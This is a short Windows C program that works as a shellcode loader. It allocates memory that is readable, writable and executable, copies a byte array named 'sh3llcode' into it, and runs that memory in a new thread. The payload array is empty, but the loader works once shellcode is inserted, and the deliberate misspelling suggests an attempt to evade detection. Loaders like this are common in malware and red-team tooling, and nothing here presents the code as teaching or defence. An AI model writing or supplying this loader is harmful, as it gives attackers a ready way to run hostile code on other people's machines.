
#include <windows.h>
#include <stdio.h>

int main() {

	unsigned char sh3llcode[] = "";

	LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(sh3llcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	MoveMemory(alloc_mem, sh3llcode, sizeof(sh3llcode));

	HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
	WaitForSingleObject(tHandle, INFINITE);

	return 0;
}
